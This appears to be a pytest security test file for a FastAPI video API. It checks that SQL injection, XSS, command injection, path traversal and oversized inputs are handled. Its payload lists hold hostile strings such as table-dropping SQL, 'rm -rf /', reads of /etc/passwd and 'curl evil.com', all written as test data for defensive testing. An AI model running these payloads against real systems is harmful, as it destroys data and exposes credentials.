"""
Input Validation Security Tests
Tests SQL injection, XSS, command injection, etc.
"""
import pytest
from fastapi.testclient import TestClient
from main import app


@pytest.fixture
def client():
    return TestClient(app)


class TestSQLInjectionSecurity:
    """Test SQL injection prevention"""
    
    def test_sql_injection_in_id_parameter(self, client):
        """SQL injection attempts in ID parameters should be blocked"""
        sql_injection_attempts = [
            "1' OR '1'='1",
            "1; DROP TABLE videos; --",
            "1' UNION SELECT * FROM users --",
            "1' OR 1=1 --",
            "admin'--",
            "1' OR '1'='1' --",
        ]
        
        for injection in sql_injection_attempts:
            response = client.get(f"/api/videos/{injection}")
            # Should either 404 (not found) or 400/422 (invalid format)
            # Should NOT return data or execute SQL
            assert response.status_code in [400, 404, 422]
            if response.status_code == 200:
                # If 200, verify it didn't return unexpected data
                data = response.json()
                # Should be a single video, not a list or error
                assert "id" in data or "detail" in data
    
    def test_sql_injection_in_query_parameters(self, client):
        """SQL injection in query parameters should be blocked"""
        sql_injection_attempts = [
            "'; DROP TABLE videos; --",
            "1' OR '1'='1",
            "test' UNION SELECT * FROM users --",
        ]
        
        for injection in sql_injection_attempts:
            response = client.get(f"/api/videos/?search={injection}")
            # Should handle safely (either work or reject)
            assert response.status_code in [200, 400, 422]
            if response.status_code == 200:
                data = response.json()
                # Should return valid data structure
                assert isinstance(data, (list, dict))
    
    def test_sql_injection_in_json_body(self, client):
        """SQL injection in JSON body should be blocked"""
        malicious_payloads = [
            {"file_name": "test'; DROP TABLE videos; --"},
            {"search": "1' OR '1'='1"},
            {"id": "1'; DELETE FROM videos; --"},
        ]
        
        for payload in malicious_payloads:
            response = client.post("/api/videos/", json=payload)
            # Should validate and reject or sanitize
            assert response.status_code in [200, 400, 422]
            if response.status_code == 422:
                # Validation error is good
                data = response.json()
                assert "detail" in data


class TestXSSSecurity:
    """Test XSS (Cross-Site Scripting) prevention"""
    
    def test_xss_in_input_fields(self, client):
        """XSS attempts in input fields should be sanitized"""
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        ]
        
        for xss in xss_attempts:
            response = client.post(
                "/api/videos/",
                json={"file_name": xss, "source_uri": "/test/path"}
            )
            # Should sanitize or reject
            assert response.status_code in [200, 400, 422]
            if response.status_code == 200:
                data = response.json()
                # Check that script tags are not in response
                response_text = str(data)
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()
    
    def test_xss_in_url_parameters(self, client):
        """XSS in URL parameters should be handled safely"""
        xss_attempts = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
        ]
        
        for xss in xss_attempts:
            response = client.get(f"/api/videos/?search={xss}")
            # Should handle safely
            assert response.status_code in [200, 400, 422]


class TestCommandInjectionSecurity:
    """Test command injection prevention"""
    
    def test_command_injection_in_file_paths(self, client):
        """Command injection in file paths should be blocked"""
        command_injection_attempts = [
            "/path/to/file; rm -rf /",
            "/path/to/file | cat /etc/passwd",
            "/path/to/file && curl evil.com",
            "/path/to/file`whoami`",
            "/path/to/file$(cat /etc/passwd)",
        ]
        
        for injection in command_injection_attempts:
            response = client.post(
                "/api/videos/",
                json={"file_name": "test.mp4", "source_uri": injection}
            )
            # Should validate and reject dangerous paths
            assert response.status_code in [200, 400, 422]
            if response.status_code == 422:
                # Validation error is good
                data = response.json()
                assert "detail" in data


class TestPathTraversalSecurity:
    """Test path traversal prevention"""
    
    def test_path_traversal_blocked(self, client):
        """Path traversal attempts should be blocked"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "....//....//etc/passwd",
        ]
        
        for traversal in path_traversal_attempts:
            response = client.get(f"/api/videos/{traversal}")
            # Should reject path traversal
            assert response.status_code in [400, 404, 422]


class TestInputSizeLimits:
    """Test input size limits to prevent DoS"""
    
    def test_large_input_rejected(self, client):
        """Very large inputs should be rejected"""
        # Very large file name
        large_input = "A" * 10000
        response = client.post(
            "/api/videos/",
            json={"file_name": large_input, "source_uri": "/test/path"}
        )
        # Should reject or truncate
        assert response.status_code in [200, 400, 413, 422]
    
    def test_deeply_nested_json_rejected(self, client):
        """Deeply nested JSON should be rejected"""
        # Create deeply nested structure
        nested = {"level": 1}
        for i in range(100):
            nested = {"level": i + 2, "nested": nested}
        
        response = client.post("/api/videos/", json=nested)
        # Should reject or handle safely
        assert response.status_code in [200, 400, 413, 422]






